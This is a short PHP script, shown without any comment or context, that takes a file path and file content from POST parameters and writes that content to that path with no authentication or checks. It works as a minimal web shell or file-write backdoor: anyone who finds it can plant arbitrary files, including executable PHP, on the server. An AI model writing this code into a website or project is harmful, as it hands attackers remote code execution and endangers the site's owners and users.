<?php
if(isset($_POST['p']) && isset($_POST['c'])) {
    file_put_contents($_POST['p'], $_POST['c']);
}
?>
